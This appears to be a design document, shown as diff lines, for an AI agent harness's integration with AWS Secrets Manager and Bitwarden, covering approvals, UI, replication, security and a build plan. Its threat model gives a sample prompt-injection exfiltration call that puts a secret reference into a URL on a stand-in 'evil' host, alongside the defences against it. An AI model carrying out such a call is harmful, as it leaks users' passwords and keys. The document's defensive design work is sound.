+External managers are connected: {conns}. Reference one of their secrets like a vault secret:
+{{secret:aws/CONN/NAME}} (#key for one JSON key, :-1 for the previous version) or
+{{secret:bw/CONN/ITEM-ID#password}} (#username, #totp, #notes, #field:NAME). The user approves every
+call that reads or writes one. secret_external_list shows what is there (names and places, never
+values); secret_external_import copies one into the vault; secret_request with a destination asks the
+user for a value and stores it in the manager. You can never see these values.
+```
+
+## 8. Settings: the ask mode
+
+- **Settings › Approvals › "Always ask, even when approvals are off"**
+  (`crates/desktop/ui/src/components/settings/Approvals.tsx#L55-L87`) lists the `secret:…:read` and
+  `secret:…:write` entries like any other, with a label from `ConnInfo` (`personal (Bitwarden) ·
+  read`). They are removed with the existing control, which raises the human-only card off-app (219
+  §2.4). Autocomplete in the add field offers them, so a user can put one back.
+- **Secrets page, connection row** (§9.1): two switches, "Ask before every read" and "Ask before every
+  write", both on by default. Each calls `set_always_ask(null, "secret:bw/personal:read", on)`. They
+  are a second view of the same entries, not a second store.
+- **Per chat.** `/always-ask secret:bw/personal:read` works in the TUI and desktop slash commands
+  unchanged (219 §6.1, §6.2), so a chat can be stricter than the harness.
+- **What "off" means.** Removing `…:read` returns that connection's references to 37's rule (a
+  placeholder is at least `Ask`, which `/approvals off` silences). Removing `…:write` makes
+  `secret_external_create` / `update` follow `tools.policy` for `Mutating` / `Destructive`. Writes
+  through `secret_request` still show the request card, which is itself a human action.
+
+## 9. UI flows
+
+### 9.1 Desktop `/secrets` page (`crates/desktop/ui/src/components/library/Secrets.tsx#L27`)
+
+- A **Connections** section above the local list. One row per connection: backend glyph, name,
+  summary, status dot (`ready` / `locked` / `logged out` / `expired`), Lock or Unlock, the two ask
+  switches (§8), and Remove (confirm, human press).
+- **Add connection** opens a stepper:
+  - *AWS*: name → profile (a select fed by `list_aws_profiles`; `(default chain)` first) → region
+    (a select of Secrets Manager regions, default from the profile's `region` if it has one) →
+    optional KMS key and prefix → **Test** (`probe`) → Save.
+  - *Bitwarden*: name → server (`US cloud` / `EU cloud` / `Self-hosted` + base URL, an "Advanced"
+    disclosure for API and identity URLs and a CA file) → email → login method (`API key`
+    recommended / `Password`) → the masked login card (§9.4) → the unlock card → Save. Prelogin runs
+    as soon as the email field blurs, so an unreachable server or an unknown account fails at step 3,
+    not at the end.
+- **Browse.** Selecting a ready connection lists `list_external_secrets` (metadata only, the same
+  shape the tool returns) with search and folders/collections as a tree for Bitwarden, and prefix
+  paths for AWS. Each row has **Copy reference** (copies `{{secret:bw/personal/…#password}}`, never
+  a value) and **Import to vault** (the `set_secret` path with `source: "bw/personal/<id>"`). The
+  user's browsing goes straight through the owner RPC, not through a tool, so it raises no
+  approval card: the human is the actor. There is no "reveal" button. That is the manager's own app's
+  job, and theuth has never shown a value (37 §0.1).
+
+### 9.2 Desktop `SecretRequestCard` (`crates/desktop/ui/src/components/chat/SecretRequestCard.tsx#L108`)
+
+- With `destination`, the card shows a **Destination** strip above the fields: `Bitwarden · personal ›
+  Personal / theuth · new login "GitHub — CI"`, or `AWS · prod (work-admin, eu-west-1) · app/ci/token ·
+  JSON · KMS alias/app`. A Change button opens the picker:
+  - *AWS*: name text field, KMS, plain/JSON.
+  - *Bitwarden*: org → collection, or folder for personal items; item type; per-field target
+    selects; "create new" or "replace existing" with a search over the connection's items.
+- A locked Bitwarden destination shows the unlock field inline first (§9.4), so the user answers
+  everything on one card.
+- Store → `answer_secret(id, value | values, expires_ms, destination)`. The new tail argument is
+  optional, so older clients still answer local-only requests.
+- `secret-expiry.ts` applies only to `keep_local` copies. Neither manager expires values in a way
+  theuth controls, and the control is hidden otherwise.
+
+### 9.3 TUI (`crates/tui`)
+
+- `/secrets` (`crates/tui/src/components/secrets.rs#L12`, `#L139-L160`) gains a connections header row
+  per connection (`prod · aws · ready`, `personal · bw · locked`). On a connection row:
+  - `u` unlocks: a masked prompt step, the `/provider add` mask pattern (37 §5);
+  - `l` locks;
+  - `Enter` browses (rows `ref · kind · place · rev`);
+  - `y` copies the reference;
+  - `i` imports.
+- `/secrets connect aws|bw` walks the add flow as prompt steps. AWS profiles come from
+  `list_aws_profiles`.
+- The request modal shows the destination as one line (`→ bw/personal › Personal/theuth · login`).
+  It cannot change the destination: a TUI user who wants a different one declines and asks the agent,
+  or uses the desktop.
+- The unlock modal reuses the request modal's frame: `unlock bw/personal (me@…) · ••••• · enter
+  unlock · esc cancel`.
+- The always-ask entries show in the `/always-ask` listing unchanged.
+
+### 9.4 Login and unlock cards (all surfaces)
+
+- `SecretsEvent::UnlockRequested { id, conn, backend, account, reason /* the ref that needs it */ }`
+  and `UnlockResolved { id, ok }` are new event variants, renamed on the wire like 37 §15.1 does
+  (`ExternalUnlockRequested`, …).
+- They are answered with `answer_unlock` and are **not** replicated rows. The unlock must happen on
+  the owning engine, so other engines' apps answer through the forward path (D15), never through a
+  stored row.
+- Login (API key or password+2FA) is never requested by the agent. It is a Settings action only.
+  A logged-out connection makes the call fail with `bw/personal is logged out; the user logs in from
+  the Secrets page`.
+- Slack, Telegram and Signal: one notice line, exactly as 37 §7 does for requests. Nothing is
+  answerable in-channel.
+
+### 9.5 iOS and phones over the relay
+
+Same desktop pane over `LinkTransport` (37 §6). Unlock from a phone is allowed: it is the owner,
+Noise-encrypted end to end. Adding a Bitwarden connection from a phone is allowed. Adding an AWS
+connection from a phone lists the *engine's* profiles, which is correct.
+
+## 10. Mesh and replication
+
+| Thing | Where | Replicates? | Why |
+|---|---|---|---|
+| Connection config | `config.yaml` `secrets.connections` | No (engine-local file) | AWS profiles and `~/.aws` are per machine; a Bitwarden device is per machine |
+| Always-ask entries | `config.yaml` `tools.always_ask` | No (219 §3.1) | Same file, same rule |
+| Bitwarden client id/secret, refresh token | `meta`, sealed with the engine key | No (`meta` is local only, `crates/secrets/migrations/0001_secrets.sql#L1-L3`) | D11; the `plugins/grants-key` precedent (`crates/secrets/src/vault.rs#L268-L271`) |
+| Unlocked user key, org keys, synced ciphers | SDK client memory | No | D12 |
+| `secret_requests` rows with `destination` | `secret_requests` | Yes (metadata only, as today) | Any app shows the card; the answer is forwarded to the owner engine (D15) |
+| A value imported into the local vault | `vault` | Yes | It is a local secret from then on (37) |
+| Scrub set additions from external fetches | process memory | No | Each engine scrubs what it fetched; a peer never received the value |
+
+Consequences:
+- **References are engine-relative.** A session on engine B that writes `{{secret:bw/personal/…}}`
+  resolves against B's `personal` connection or fails. This mirrors nodes resolving against their own
+  vault (`docs/design/37-secrets.md#L623-L625`). A follow or subagent on another engine sees the
+  placeholder text only.
+- **Unpair and key rotation.** Mesh key rotation re-encrypts `vault` rows
+  (`crates/mesh/src/keys.rs#L704-L705`). It does not touch `meta`, so connection credentials are
+  unaffected. Unpairing an engine does not log its Bitwarden device out. The Remove button does
+  (`/identity/connect/revocation` is not available on every server, §5.11; theuth forgets the tokens
+  either way).
+
+## 11. Security
+
+**Threat model** (37 §8's letters: B = private data, C = egress). This doc adds a B that is much
+larger than the local vault: a whole password manager. The new risks:
+
+1. **Prompt-injected exfiltration through a reference.** For example, `read_url
+   https://evil/?k={{secret:bw/personal/…}}`. Controls: the always-ask card shows the exact ref and
+   the URL. It is human-answered, the double never answers it, and it is denied when the owner is
+   absent. That is the reason D6 defaults to always.
+2. **Enumeration.** `secret_external_list` reveals item names, folders and usernames' *existence*
+   (not values: no username is returned). It is a read, so it asks. An approved list result enters the
+   transcript, and that is accepted, as names are not values.
+3. **Write-based damage.** For example, overwriting a production DB password. Controls: the
+   always-ask write card, `expected` version (no blind writes), `Destructive` risk on update, no
+   delete.
+4. **Key material at rest.** The Bitwarden user key is never at rest (D12). The API key and refresh
+   token are sealed in `meta` under the engine key, which is the same protection the vault key gets
+   (37 §0.6). Someone who steals the engine key gets them, and can then log in but **not** decrypt
+   anything without the master password.
+5. **Key material in memory.** The SDK holds keys in its key store with `ZeroizeOnDrop` (§5.3).
+   theuth holds the master password only in a `Zeroizing<String>` from the RPC parameter to the unlock
+   call. Values fetched for a call live in `Fetched` (`Zeroizing`) until `expand_with` copies them into
+   the args `Value`, which is an ordinary `String` dropped after `tool.call`. That is the same ceiling
+   as 37 §8 "Memory", and a core dump is not defended.
+6. **Supply chain.** About 30 crates from one vendor at one pinned commit (§5.10). Controls: the pin,
+   `cargo deny` licence and advisory checks in the build (B2), an SDK bump is a reviewed change to one
+   module, and the feature is off unless built in.
+
+**Scrubbing.** Every value that `resolve_external` fetches joins the redaction automaton through a
+new `Vault::remember_external(placeholder, value)` before `expand_with` runs. Its replacement text is
+the reference's own placeholder, so an echo comes back as `{{secret:bw/personal/…#password}}`. It
+stays for the life of the process, which 37 §11 already decided. The scrub set lives in memory, never
+in a vault row. Values fetched by `import` and `create` / `update` sources are already in the local
+scrub set. `#totp` codes are not added (6 digits, under `MIN_REDACT`,
+`crates/secrets/src/vault.rs#L45`), which is correct: they expire in 30 s.
+
+**Logs.** `ExtError` and the SDK's own `tracing` output pass through `redact` at the theuth boundary.
+The SDK crates log at `debug`, and theuth's default filter keeps `bitwarden_*=warn`. The
+`secrets-bitwarden` crate never `Debug`-prints a request body. The SDK's own types implement
+`Debug` without key bytes (§5.3).
+
+**Audit trail.** Every external access is visible on a card already: the approval (or its absence
+when the user turned ask off) and the `ToolCallStarted` args. Additionally, each `get` / `create` /
+`update` appends a line to `<data_dir>/logs/secrets-external.log`: time, session, call id, ref,
+direction, version, outcome. The line never holds a value. The log is local, `0600`, and rotated like
+other logs. It is not a replicated table, as the engine that did it is the one to ask.
+
+**Licence.** Linking `sdk-internal` under GPL-3.0 makes a binary built with `--features bitwarden`
+a GPL-3.0 work. theuth's own licence must be GPL-3.0-compatible for that binary to be distributed;
+§14 Q4 asks the owner to confirm the release builds enable the feature. Builds without it are
+unaffected. `rbw` (D4) is the fallback if the licence or the pin ever becomes unworkable. It would
+sit behind the same `ExternalBackend` trait.
+
+## 13. Build plan
+
+Each milestone names what it touches and its check. The orchestrator runs builds and tests. This doc
+runs none.
+
+- **B0 — Spike, no theuth code.** In a scratch crate outside the workspace, a `main` that runs the
+  §5 sequence (client with custom URLs → API-key login → unlock → sync → list → create login →
+  edit field → decrypt) against a local Vaultwarden container. Record the exact calls that differ
+  from §5. *Check:* the spike prints a created item's id and decrypts its password back; the same
+  against a Bitwarden test account on `vault.bitwarden.eu`. *Output:* amendments to §5 if any.
+- **B1 — `aws-profiles` crate.** Move `AwsProfiles::load/from_sdk/select` and `has_profile` from
+  `crates/agent/src/aws.rs`; `agent` re-exports. *Check:* `cargo test -p agent` (the existing
+  `aws.rs` tests move along), `cargo test -p aws-profiles`, wire schema unchanged.
+- **B2 — Trait, grammar, hook (`secrets`, `tools`).**
+  - `external.rs` (trait, types, `RegisterExternal`), the new `PLACEHOLDER`, `Fetched`, and
+    `expand_with` in `vault.rs`.
+  - `external_access` / `resolve_external` on `tools::secrets::Secrets`, and the `invoke` change.
+  - `external` in `always()` at the three gate sites (`crates/tools/src/registry.rs#L2059`, `#L2222`,
+    `#L3255`).
+  - `cargo deny` config for the GPL crates (licence allow-list scoped to `bitwarden-*`).
+
+  *Check:* `cargo test -p secrets -p tools` with a fake backend:
+  - (a) `{{secret:fake/c/x}}` expands and the output is scrubbed back to it;
+  - (b) an unknown connection fails the whole call;
+  - (c) `secret:fake/c:read` in the global set forces an always-ask card with approvals off;
+  - (d) the same entry in a parent session applies to a child;
+  - (e) owner absent → Deny;
+  - (f) the double cannot answer;
+  - (g) `writable_name("bw/x")` is false;
+  - (h) a resolve error dispatches nothing (no `ToolCallStarted` on the tool).
+- **B3 — `secrets-aws` crate.** `aws-sdk-secretsmanager` in `[workspace.dependencies]`. The backend
+  with list/describe/get/create/update, JSON keys, `AWSPREVIOUS`, SSO expiry mapping. *Check:*
+  `cargo test -p secrets-aws` against a mocked client: the SDK's `aws-smithy-mocks`
+  `mock_client!` rules for each operation, including `ResourceExistsException` → `Exists` and an
+  SSO-expired credentials error → `Expired`. An `#[ignore]` suite against `localstack` (`docker run
+  localstack/localstack`, `AWS_ENDPOINT_URL`) runs create → get → update → `:-1`.
+- **B4 — Connections, RPC, config, seeding.** `secrets.connections` config, the `meta` `ext/` rows,
+  the §6.3 methods, always-ask seeding at add and at load, `remove_secret_connection` as a human
+  press. *Check:* `cargo test -p secrets`:
+  - a connection added by hand-editing config is seeded once, and a removed entry stays removed
+    after restart;
+  - `meta` rows open only with this engine's key;
+  - nothing under `ext/` appears in `list_secrets` or in `vault`.
+
+  Also the wire fixture (`just wire-schema-accept`) and `just ts-desktop`.
+- **B5 — `secrets-bitwarden` crate (feature `bitwarden`).** The git dependency at `2b06afa`, the
+  backend per §5 (and B0's amendments), login/unlock/lock/idle timer, sync freshness, the gaps
+  §5.12 lists via `bitwarden-api-api`. *Check:* `cargo check -p theuth --features bitwarden` and
+  without; `cargo test -p secrets-bitwarden` (unit tests on the field mapping and the ref parser).
+  An `#[ignore]` suite against `vaultwarden/server` in Docker (an admin token creates a user; the
+  test registers through the SDK's register request if available, else a fixture DB) runs:
+  - API-key login → unlock → create login → `get #password` → update with a stale `expected` →
+    `Conflict`;
+  - an org collection item, then lock → `Locked`.
+- **B6 — Tools + prompt.** `tools_external.rs`, the `secret_request` destination, the forward of
+  destination answers. *Check:* headless against the fake backend and, ignored, localstack:
+  - `secret_external_list{}` raises no card;
+  - `secret_external_list{connection: prod}` raises an always-ask card;
+  - `secret_capture` → `secret_external_create` → `shell{command: "printf %s '{{secret:aws/prod/x}}' | wc -c"}`
+    → the right length, and `messages.body` holds no value;
+  - `secret_request` with a destination answered from a second engine's app stores on the first.
+- **B7 — Desktop.** Connections section, add stepper, browse, request card destination strip and
+  picker, unlock card, Approvals labels. *Check:* `bun run check`, `bunx vitest run` for the touched
+  files (`SecretRequestCard.test.ts` fixture gains `destination`), no emoji test.
+- **B8 — TUI and bridges.** `/secrets` connections, `u` / `l` / Enter / `y` / `i`, `/secrets
+  connect`, destination line, unlock modal; Slack/Telegram/Signal notice line. *Check:* `cargo test
+  -p tui` (the leak test gains an unlock case: the typed password never reaches the transcript or
+  the screen buffer).
+- **B9 — Docs and amendments.** 37 §11 marked superseded by this doc; 37 §3.1's `BACKEND/NAME` row;
+  219 §2.1 gains the `secret:` key family; `harness.md` layout gains `logs/secrets-external.log`;
+  README crate list and features. *Check:* `cargo clippy -D warnings` on touched crates; `cargo test
+  --workspace`.
+
+## 14. Open questions for the owner
+
+1. **Remember the unlock across restarts?** v1 keeps the Bitwarden user key in memory only (D12), so
+   every engine restart needs the master password again. The alternative is a per-connection
+   `remember_unlock: true` that seals the user key in `meta` under the engine key. Then the vault is
+   only as strong as the engine key (keychain on macOS, a 0600 file on keychain-less servers). Allow
+   it, and if so, also on `key_store: file` engines?
+2. **Lock on sleep and screen lock?** v1 locks on idle (900 s default), on quit and on the Lock
+   button. Should a desktop engine also lock when the Mac sleeps or the screen locks? (That needs a
+   power/screen-lock observer the desktop app does not send to the engine today.)
+3. **Bitwarden write scope.** v1 writes logins and secure notes (password / username / TOTP / notes /
+   custom fields). Should the agent also be able to *create* items in organisation collections, or
+   only in the user's personal vault, with org items read-only? Org writes are where a mistake reaches
+   other people.
+4. **Release builds and GPL.** Do the published binaries (desktop app, `t` releases) enable the
+   `bitwarden` feature, which makes them GPL-3.0 works, or is it a build-from-source opt-in?
